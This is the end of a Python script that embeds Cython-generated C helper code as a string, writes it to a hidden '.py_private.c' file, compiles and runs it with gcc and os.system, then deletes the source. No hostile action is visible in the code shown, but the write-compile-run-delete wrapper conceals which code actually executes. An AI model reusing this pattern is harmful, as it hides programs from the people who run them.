                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
